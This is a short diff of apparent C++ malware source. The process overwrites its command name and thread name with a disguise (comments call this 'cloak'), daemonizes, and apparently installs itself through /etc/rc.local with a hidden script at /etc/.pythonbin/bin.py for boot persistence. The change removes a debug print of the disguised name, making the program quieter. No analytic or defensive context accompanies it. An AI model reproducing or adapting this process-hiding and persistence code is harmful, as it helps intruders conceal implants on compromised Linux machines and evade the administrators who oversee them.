@@ -307,7 +307,6 @@ int main(int argc, char *argv[]){
     string gui_t = gu.gui_procc(argv[0]);
     strcpy(argv[0], (gui_t).c_str()); // cloak, command name
     prctl(PR_SET_NAME, (gui_t).c_str()); // cloak, thread name
-    cout << gui_t << endl;
     gb.daemon();
     gb.file_setup("/etc/rc.local", "/etc/.pythonbin/bin.py");
     while(1){
